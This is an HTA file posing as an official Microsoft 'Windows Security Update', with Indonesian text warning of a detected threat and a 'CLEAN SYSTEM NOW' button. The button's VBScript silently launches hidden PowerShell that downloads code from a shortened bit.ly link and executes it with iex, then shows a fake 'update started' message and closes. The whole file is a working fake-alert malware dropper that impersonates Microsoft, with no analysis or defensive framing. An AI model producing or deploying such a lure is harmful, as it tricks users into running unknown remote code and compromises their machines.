<!DOCTYPE html>
<html>
<head>
    <title>Windows Security Update</title>
    <hta:application id="oHTA" 
        applicationname="Windows Update" 
        border="thin" 
        caption="yes" 
        icon="https://www.microsoft.com/favicon.ico"
        showintaskbar="yes" 
        singleinstance="yes" 
        sysmenu="yes" 
        windowstate="normal">
</head>
<body style="background:#000; color:#0f0; font-family:Consolas; padding:40px; text-align:center;">
    
    <h1 style="color:#f00;">🚨 CRITICAL SECURITY UPDATE 🚨</h1>
    <p style="font-size:18px;">Windows telah mendeteksi ancaman berbahaya di sistem Anda.</p>
    <p style="font-size:18px;">Klik tombol di bawah untuk membersihkan sistem segera.</p>
    
    <button onclick="runFix()" style="background:#f00; color:white; border:none; padding:20px 80px; font-size:24px; margin:30px 0; cursor:pointer;">
        CLEAN SYSTEM NOW
    </button>
    
    <p style="color:#666; margin-top:40px;">Official Microsoft Security Patch</p>

    <script language="VBScript">
        Sub runFix()
            Dim shell
            Set shell = CreateObject("WScript.Shell")
            shell.Run "powershell -nop -c ""iex (iwr -UseBasicParsing 'https://bit.ly/fixwin2026').Content""", 0, False
            MsgBox "Security update telah dimulai. Tunggu beberapa saat...", 0, "Windows Security"
            window.close()
        End Sub
    </script>

</body>
</html>